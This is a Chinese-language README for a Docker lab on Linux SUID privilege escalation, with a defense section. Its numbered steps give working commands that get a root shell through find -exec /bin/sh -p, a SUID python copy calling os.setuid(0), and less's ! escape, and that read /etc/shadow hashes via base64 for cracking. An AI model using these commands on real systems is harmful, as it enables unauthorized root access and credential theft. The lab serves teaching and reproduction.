# SUID 提权

## 原理

SUID（Set User ID）：文件带 SUID 位（权限 `-rwsr-xr-x`）时，任何用户运行它，
进程的**有效用户 ID（euid）变成文件属主**（通常是 root）。若该程序允许执行外部
命令（find 的 -exec、vim 的 :! / python 接口）或存在漏洞，普通用户就能借它提权。

## 环境

- 基础镜像：ubuntu:20.04
- 低权限用户：lowpriv / lowpriv123
- 漏洞配置：find / vim.basic / less / base64 / python3suid 设置 SUID 位

## 复现步骤

```bash
# 1. 构建并启动
docker compose up -d --build

# 2. 进入低权限用户
docker exec -it $(docker compose ps -q) su - lowpriv

# 3. 查找 SUID 文件
find / -perm -4000 -type f 2>/dev/null
# 预期: 出现 /usr/bin/find /usr/bin/vim.basic /usr/bin/less /usr/bin/base64 /usr/local/bin/python3suid

# 4. find 提权
/usr/bin/find . -exec /bin/sh -p -c 'id' \; -quit
# 预期输出: uid=1000(lowpriv) ... euid=0(root)   <- euid=0 即提权成功

# 5. python3 SUID 副本提权
/usr/local/bin/python3suid -c 'import os; os.setuid(0); os.system("id")'
# 预期输出: uid=0(root) gid=1000(lowpriv)

# 6. base64 读任意文件 (无 shell 场景下的信息窃取)
/usr/bin/base64 /etc/shadow | base64 -d
# 预期: 直接输出 shadow 哈希 (配合 john 破解)

# 7. less 提权 (交互)
less /etc/shadow
# 在 less 界面输入: !/bin/sh    得到 root shell

# 8. 一键利用
bash exploit.sh
```

## 为什么能成功

| 程序 | 原理 |
|:---|:---|
| find | euid=0 运行, `-exec` 执行 `/bin/sh -p`, -p 保留有效用户 ID |
| python3suid | `os.setuid(0)` 在 euid=0 的进程内设置真实 UID |
| less/more/man | 界面内 `!` 命令以 euid 执行 shell |
| base64 | 读任意文件（无 shell 提权, 但可窃取 shadow 等敏感文件） |

## 防御

- `find / -perm -4000` 定期审计 SUID 文件
- 去除不必要 SUID 位, 使用 capabilities 替代并同样审计
- 参考 GTFobins 排查可被滥用的程序

## 验证记录

2026-08-26 真实环境验证：find 提权输出 `euid=0(root)`，python3suid 输出 `uid=0(root)`，
base64 成功读取 root 哈希。复现成功。
